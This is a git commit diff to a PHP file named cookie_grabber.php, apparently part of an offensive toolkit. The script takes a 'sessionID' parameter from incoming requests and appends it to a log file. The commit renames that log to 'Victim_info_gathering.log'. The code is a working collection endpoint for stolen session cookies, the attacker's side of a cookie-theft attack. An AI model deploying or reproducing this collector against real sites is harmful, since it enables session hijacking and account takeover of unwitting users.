3255f708c444794673810ee2f762ba4fc6e9c5ef
kleiton0x00 <37262788+kleiton0x00@users.noreply.github.com>
2020-10-15 20:19:47 +0200

    Update cookie_grabber.php

--- cookie_grabber.php
+++ cookie_grabber.php
@@ -1,6 +1,6 @@
 <?php
 if(!empty($_GET['sessionID'])) {
-    $logfile = fopen('Cookie_logs.log', 'a+');
+    $logfile = fopen('Victim_info_gathering.log', 'a+');
     fwrite($logfile, $_GET['sessionID']);
     fclose($logfile);
 }
